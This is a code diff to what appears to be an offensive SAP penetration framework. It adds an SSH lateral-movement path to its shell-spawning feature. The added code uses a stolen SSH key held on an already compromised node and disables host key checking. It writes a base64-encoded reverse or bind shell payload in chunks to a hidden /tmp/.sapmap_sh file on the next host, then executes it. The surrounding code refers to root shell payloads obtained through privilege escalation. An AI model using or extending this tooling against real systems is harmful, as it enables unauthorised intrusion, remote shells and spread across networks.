@@ -7224,12 +7224,21 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
         def _send():
             target_host = node.ip or node.hostname
-            # Determine OS — probe via cmd.exe if os_type not populated yet
-            # (e.g. freshly-added nodes where the discovery scan hasn't run).
-            # _detect_is_windows caches the result in node.os_type so it
-            # only ever runs the probe once per node.
-            is_win = _detect_is_windows(node, method=method)
-            py_cmd = "python3" if is_win else _detect_python_cmd(node)
+            # SSH targets: use the SSH target IP and skip OS detection
+            # (SSH key-based lateral movement is Linux-only in practice)
+            if method == "ssh":
+                ssh_acc = (getattr(node, "ssh_access", None) or [None])[0]
+                if ssh_acc:
+                    target_host = ssh_acc.get("target", target_host)
+                is_win = False
+                py_cmd = "python3"
+            else:
+                # Determine OS — probe via cmd.exe if os_type not populated yet
+                # (e.g. freshly-added nodes where the discovery scan hasn't run).
+                # _detect_is_windows caches the result in node.os_type so it
+                # only ever runs the probe once per node.
+                is_win = _detect_is_windows(node, method=method)
+                py_cmd = "python3" if is_win else _detect_python_cmd(node)
             if shell_mode == "bind":
                 payload = _generate_bind_payload(
                     node.os_type, shell_port, python_cmd=py_cmd)
@@ -7497,6 +7506,92 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     print(f"[+] {sid}: root shell payload spawned "
                           f"via {lpe_res.get('method')}; expect "
                           f"connection as root")
+            elif method == "ssh":
+                # SSH lateral: deliver the shell payload to the
+                # target by writing base64 chunks via SSH from the
+                # source node, then executing it.
+                ssh_access = getattr(node, "ssh_access", None) or []
+                if not ssh_access:
+                    print(f"[-] {sid}: No SSH access for shell delivery")
+                    with _shell_lock:
+                        if _shell_session:
+                            _shell_session.status = "error"
+                            _shell_session.error_msg = "No SSH access"
+                    return
+                acc = ssh_access[0]
+                src_node = api.state.get_node(acc["from_sid"])
+                if not src_node:
+                    print(f"[-] {sid}: Source node {acc['from_sid']} not found")
+                    with _shell_lock:
+                        if _shell_session:
+                            _shell_session.status = "error"
+                            _shell_session.error_msg = (
+                                f"Source node {acc['from_sid']} not found")
+                    return
+
+                # Build the raw Python3 payload string
+                prog = payload.get("command", "python3")
+                params_str = payload.get("params", "")
+                py_script = f"{prog} {params_str}"
+                if shell_mode == "reverse":
+                    py_script = (f"nohup {prog} {params_str} "
+                                 f"</dev/null >/dev/null 2>&1 &")
+
+                import base64 as _b64ssh
+                py_b64 = _b64ssh.b64encode(
+                    py_script.encode()).decode()
+
+                # SSH args prefix (reused for every call)
+                ssh_prefix = (
+                    f"-oBatchMode=yes "
+                    f"-oStrictHostKeyChecking=no "
+                    f"-oUserKnownHostsFile=/dev/null "
+                    f"-i {acc['key_path']} "
+                    f"{acc['username']}@{acc['target']}")
+
+                # Calculate chunk size: 255 - len(prefix) - wrapper
+                # wrapper = ' "echo |base64 -d>>/tmp/.sapmap_sh"' = ~40
+                avail = 255 - len(ssh_prefix) - 42
+                if avail < 20:
+                    avail = 40  # fallback
+                chunks = [py_b64[i:i+avail]
+                          for i in range(0, len(py_b64), avail)]
+
+                # Clean any previous payload file
+                _set_progress("Preparing SSH payload delivery...")
+                sapmap_exploit.execute_gw_command(
+                    src_node, "ssh",
+                    f'{ssh_prefix} "rm -f /tmp/.sapmap_sh"',
+                    long_params="")
+
+                # Write chunks
+                total = len(chunks)
+                for idx, chunk in enumerate(chunks):
+                    if _session_ref.cancelled:
+                        print(f"[*] {sid}: SSH payload delivery cancelled")
+                        return
+                    _set_progress(
+                        f"Writing payload chunk {idx+1}/{total} "
+                        f"via SSH...")
+                    ssh_args = (
+                        f'{ssh_prefix} '
+                        f'"echo {chunk}|base64 -d>>/tmp/.sapmap_sh"')
+                    sapmap_exploit.execute_gw_command(
+                        src_node, "ssh", ssh_args, long_params="")
+
+                # Execute
+                _set_progress("Executing shell payload via SSH...")
+                ssh_args = (
+                    f'{ssh_prefix} '
+                    f'"chmod +x /tmp/.sapmap_sh;sh /tmp/.sapmap_sh"')
+                result = sapmap_exploit.execute_gw_command(
+                    src_node, "ssh", ssh_args, long_params="")
+                result["success"] = True  # SSH fire-and-forget
+
+                print(f"[+] {sid}: SSH shell payload delivered "
+                      f"via {acc['from_sid']} → "
+                      f"{acc['username']}@{acc['target']}")
+
             else:
                 # SXPG: split EXTPROG + PARAMS
                 creds = node.best_credentials()
